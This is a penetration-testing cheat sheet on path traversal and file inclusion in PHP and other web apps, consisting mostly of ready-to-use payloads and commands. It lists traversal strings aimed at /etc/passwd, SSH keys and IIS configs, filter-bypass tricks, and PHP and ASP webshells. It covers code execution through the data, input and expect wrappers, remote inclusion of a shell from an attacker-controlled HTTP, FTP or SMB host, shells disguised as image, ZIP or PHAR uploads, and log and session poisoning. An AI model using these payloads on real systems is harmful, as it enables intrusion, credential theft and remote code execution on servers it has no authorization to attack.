# 🏞 Path Traversal & File Inclusion

This works with all languages regardless of backend framework.

**Automatic: LFISuite, LFiFreak, and liffy**

**Attack Vectors to Check:**

**Linux**

1. .ssh (try authorized key to check for access and type of key(id\_rsa or id\_ecdsa))
2. config.php
3. /etc/passwd

* To avoid `..` use `cat .?/.*/.?/etc/passwd`
* If `shell_exec` function is allowed try [phpbash](https://github.com/Arrexel/phpbash)

**Windows:**

1. `c:\Windows\System32\Drivers\etc\hosts`
2. IIS logs: `C:\inetpub\logs\LogFiles\W3SVC1\.`
3. IIS config with user and pass: `C:\inetpub\wwwroot\web.config`

* Example in grafana:&#x20;

{% code overflow="wrap" %}
```
curl --path-as-is http://ip:port/public/plugins/alertlist/../../../../../../../../Windows/System32/Drivers/etc/hosts
```
{% endcode %}

_ASP webshell:_ `<% eval request('cmd') %>`&#x20;

_PHP webshell:_ `<?php system($_GET["cmd"]); ?>`

## Scanning

To fuzz for GET parameters:

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
```

Most common in [this link](https://book.hacktricks.xyz/pentesting-web/file-inclusion#top-25-parameters) Lfi [wordlists](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI) [Suggested](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt)

To fuzz LFI:

```
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
```

To Fuzz for php files:

```
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
```

### Fuzzing Server Files

#### Webroot

To fuzz for index.php use [wordlist for Linux ](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt)or [wordlist for windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt) Depending on our LFI situation, we may need to add a few back directories (e.g. ../../../../), and then add our index.php afterwords. Example:

```
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
```

Can also use this [wordlist](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt)

#### Server Logs & Configs

Can use the same [wordlist](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt)or [wordlist for Linux ](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt)or [wordlist for windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt) Example:

```
ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
```

## Path traversal

_When filenames are used as parameters pay close attention_ Example:

```
https://example.com/cms/login.php?language=en.html
```

We can see that en.html is being loaded which means that we can try to access it directly:

```
https://example.com/cms/en.html
```

Absolute path like `/etc/passwd` can be used if the whole input used without any addition

```php
include($_GET['language']);
```

_Linux:_ `../` or `.?/.*/.?/` _Windows:_ `..\` or `../` in some cases

* Example in grafana:&#x20;

```
curl --path-as-is http://192.168.163.193:3000/public/plugins/alertlist/../../../../../../../../Windows/System32/Drivers/etc/hosts
```

#### Directory prefix

But there can be additions like the language directory here:

```php
include("./languages/" . $_GET['language']);
```

Then can use the trick like so:

```
../../../../etc/passwd
```

```
http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/passwd
```

On windows:

```
c:\Windows\System32\Drivers\etc\hosts
```

#### Filename prefix

```php
include("lang_" . $_GET['language']);
```

The fix is to try `/` first. Like so: `http://<SERVER_IP>:<PORT>/index.php?language=/../../../etc/passwd`

**Note**: This may not always work

#### Appended Extensions

**Path truncation**

```php
include($_GET['language'] . ".php");
```

So if we search for `/etc/passwd` then `/etc/passwd.php` will be searched for.

In earlier versions of PHP, defined strings have a maximum length of 4096 characters, likely due to the limitation of 32-bit systems. If a longer string is passed, it will simply be truncated, and any characters after the maximum length will be ignored.

PHP, and Linux systems in general, also disregard multiple slashes in the path (e.g. ////etc/passwd is the same as /etc/passwd). Similarly, a current directory shortcut (.) in the middle of the path would also be disregarded (e.g. /etc/./passwd).

If we combine both of these PHP limitations together, we can create very long strings that evaluate to a correct path. Example: `?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]`&#x20;



Can use bash for this

```bash
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
```

**Null bytes**

Adding a null byte (%00) at the end of the string would terminate the string and not consider anything after it. o exploit this vulnerability, we can end our payload with a null byte (e.g. `/etc/passwd%00`)

#### Non recursive filters

```php
$language = str_replace('../', '', $_GET['language']);
```

It doesnt delete all `../` recursively so can do `....//` or escape the backslash with `....\/` to get around this like so:

```
http://<SERVER_IP>:<PORT>/index.php?language=....//....//....//....//etc/passwd
```

#### Encoding

Mostly can be used on older versions of php (5.3.4 earlier) can encode `../` to `%2e%2e%2f` can use burpsuite for this.

![](<../../.gitbook/assets/File Inclusion (php, nodejs,etc).png>)

Example:&#x20;

```
<SERVER_IP>:<PORT>/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
```

#### Approved Paths

Some webapps use regular expressions like so to restrict directory:

```php
if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
    include($_GET['language']);
} else {
    echo 'Illegal path specified!';
}
```

Can go to languages directory and go back

```
<SERVER_IP>:<PORT>/index.php?language=./languages/../../../../etc/passwd
```

## Local File Inclusion

We often see a parameter like `/index.php?page=about`, where `index.php` sets static content (e.g. header/footer), .only pulls the dynamic content specified in the parameter, which in this case may be read from a file called `about.php`.

Nodejs also can load content based on HTTP parameter.&#x20;

<figure><img src="../../.gitbook/assets/File Inclusion.png" alt=""><figcaption></figcaption></figure>

Example:&#x20;

```
http://<SERVER_IP>:<PORT>/index.php?language=/etc/passwd
```

### PHP Wrappers

#### Filter

We can access php filter with `php://filter/` The filter wrapper has several parameters, but the main ones we require for our attack are resource and read. **4 types of filters**: String Filters, Conversion Filters, Compression Filters, and Encryption Filters

**PHP Inclusion Using Filter**

To read _source code_ instead of executing the php file like this:&#x20;

```
http://<SERVER_IP>:<PORT>/index.php?language=config
```

Use the filter:

```
php://filter/read=convert.base64-encode/resource=config
```

Use like this

```
http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=config
```

This returns base64 encoded file.

**Checking PHP Configurations**

To do so, we can include the PHP configuration file found at (`/etc/php/X.Y/apache2/php.ini`) for Apache or at (`/etc/php/X.Y/fpm/php.ini`).

We will also use the base64 filter we used in the previous section, as .ini files are similar to .php files and should be encoded to avoid breaking.

#### Data

This wrapper can be used for **RCE**

Check `allow_url_include` if enabled, this option is not enabled by default:

* `/etc/php/X.Y/apache2/php.ini` for apache
* `/etc/php/X.Y/fpm/php.ini` for Nginx Example:

```
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```

Then check with

```
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
```

**Remote Code Execution**

**Without Encoding:**

```
curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
```

**With Encoding**:

With data wrapper can include external data. Can pass base64 with `text/plain;base64`

1. Base64 encode webshell. `echo '<?php system($_GET["cmd"]); ?>' | base64`
2. Then pass data wrapper with the base64 `data://text/plain;base64,` Like so

```
http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
```

#### Input

The difference between input and the data wrapper is that we pass our input to the input wrapper as a POST request's data. Input wrapper also depends on the allow\_url\_include setting, as mentioned earlier.

To repeat our earlier attack but with the input wrapper, we can send a POST request to the vulnerable URL and add our web shell as POST data. To execute a command, we would pass it as a GET parameter, as we did in our previous attack:

```
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
```

#### Expect

Allows us to directly run commands through URL streams. Need to check for expect as it is an external wrapper.&#x20;

```
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
```

&#x20;Refer [#data](path-traversal-and-file-inclusion.md#data "mention") for where to check.&#x20;

To run commands:&#x20;

```
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://<command>"
```

## Remote File Inclusion (RFI)

Vulnerable:

<figure><img src="../../.gitbook/assets/File Inclusion (php, nodejs,etc)-1.png" alt=""><figcaption></figcaption></figure>

Not every LFI is RFI because:

1. The vulnerable function may not allow including remote URLs
2. You may only control a portion of the filename and not the entire protocol wrapper (ex: http://, ftp://, https://).
3. The configuration may prevent RFI altogether, as most modern web servers disable including remote files by default.&#x20;

**To check:**

1. This also requires `allow_url_include`. check from [#data](path-traversal-and-file-inclusion.md#data "mention")
2.  Then check for remote code with local file like so&#x20;

    `http://127.0.0.1:80/index.php`.&#x20;

    Try `http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php`
3. If the back-end server hosted any other local web applications (e.g. port 8080), then we may be able to access them through the RFI vulnerability by applying SSRF techniques on it.&#x20;

**Note**: It may not be ideal to include the vulnerable page itself (i.e. index.php), as this may cause a recursive inclusion loop and cause a DoS to the back-end server.&#x20;



To run shell from local try.&#x20;

```
http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
```

&#x20;If http port is blocked.&#x20;

Host:&#x20;

```
sudo python -m pyftpdlib -p 21
```

&#x20;Target:

```
http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id
```

&#x20;Or if validation required:&#x20;

```
curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
```

### SMB

If the vulnerable web application is hosted on a Windows server (which we can tell from the server version in the HTTP response headers), then we do not need the allow\_url\_include setting to be enabled.&#x20;

Host:&#x20;

```
impacket-smbserver -smb2support share $(pwd)
```

&#x20;Target:&#x20;

```
http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
```

## File uploads

### Malicious Image

To create `echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif` **Note**: We are using a GIF image in this case since its magic bytes are easily typed, as they are ASCII characters, while other extensions have magic bytes in binary that we would need to URL encode. However, this attack would work with any allowed image or file type.

Then use like so with&#x20;

```
http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
```

### ZIP upload

There are also other php wrapper with same functionality.

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

Even tho it is a .jpg it can be detected so ot has a better chance of working if zip upload allowed. Use zip wrapper to execute.&#x20;

```
http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```

### PHAR upload

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```

This can be compiled to phar file now

```bash
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

To use this:&#x20;

```
http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```

**Note**: There is another (obsolete) LFI/uploads attack worth noting, which occurs if file uploads is enabled in the PHP configurations and the phpinfo() page is somehow exposed to us. However, this attack is not very common, as it has very specific requirements for it to work (LFI + uploads enabled + old PHP + exposed phpinfo()). If you are interested in knowing more about it, you can refer to [This Link](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-phpinfo).

### Log poisoning

Writing PHP code in a field we control that gets logged into a log file (i.e. poison/contaminate the log file), and then include that log file to execute the PHP code.&#x20;

<figure><img src="../../.gitbook/assets/File Inclusion (php, nodejs,etc)-2.png" alt=""><figcaption></figcaption></figure>

#### PHP Session Poisoning

PHP web apps use PHPSESSID cookies to hold user-related data, enabling session tracking. These details are stored in session files on the server, typically in `/var/lib/php/sessions/` on Linux and `C:\Windows\Temp\` on Windows. File names match PHPSESSID cookie names, e.g., sess\_el4ukv0kqbvoirg7nkp4dncpk3.

1. Check session id
2.  Try including the session file:&#x20;

    `http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd`
3.  Write url encoded php shell to session by changing the url parameter&#x20;

    `http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E`
4.  Now it will be saved to session so execute it by&#x20;

    `http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id`
5. Refer HTB academy for full context.

#### Server Log poisoning

Both Apache and Nginx maintain various log files, such as _access.log_ and _error.log_.&#x20;

_Apache_ -> `/var/log/apache2/` or `C:\xampp\apache\logs\`&#x20;

_Nginx_ -> `/var/log/nginx/` or `C:\nginx\log\`&#x20;

It includes **User-Agent header** so we can control it We need read access over the logs(mostly only by root but older ones have lower privilege req.) .

Use burp to modify user-agent or curl with&#x20;

```
curl -s "http://<SERVER_IP>:<PORT>/index.php" -A "<?php system($_GET['cmd']); ?>"
```

Then run&#x20;

```
http://<SERVER_IP>:<PORT>/index.php?language=../../../var/log/apache2/access.log&cmd=id
```

&#x20;**NOTE**: `&cmd not ?cmd`&#x20;

**Tip**: The User-Agent header is also shown on process files under the Linux `/proc/`directory. So, we can try including the `/proc/self/environ` or `/proc/self/fd/N` files (where N is a PID usually between 0-50), and we may be able to perform the same attack on these files. This may become handy in case we did not have read access over the server logs, however, these files may only be readable by privileged users as well.

Try these too:

* /var/log/sshd.log
* /var/log/mail
* /var/log/vsftpd.log

If the ssh or ftp services are exposed to us, and we can read their logs through LFI, then we can try logging into them and set the username to PHP code, and upon including their logs, the PHP code would execute. The same applies the mail services, as we can send an email containing PHP code, and upon its log inclusion, the PHP code would execute. We can generalize this technique to any logs that log a parameter we control and that we can read through the LFI vulnerability.

## Second Order Attacks

* Second Order LFI attacks are more advanced and occur when web applications insecurely pull files based on user-controlled parameters.
* For instance, if a web app allows downloading avatars via URLs like (/profile/$username/avatar.png), crafting a malicious LFI username (e.g. ../../../etc/passwd) can exploit this vulnerability.
* Attack involves poisoning a database entry with a malicious LFI payload in the username, which is then utilized by another function to perform the attack.
* Developers often overlook these vulnerabilities, trusting values pulled from their database, like usernames, leading to exploitation if the username is poisoned during registration.
* Exploiting LFI via second-order attacks involves identifying functions that pull files based on indirectly controlled values and manipulating those values to exploit the vulnerability.&#x20;

```
http://94.237.49.166:36818/index.php?language=/var/lib/php/sessions/sess_frngbetk4dh8v4kpt2kulajgab&cmd=whoami
```
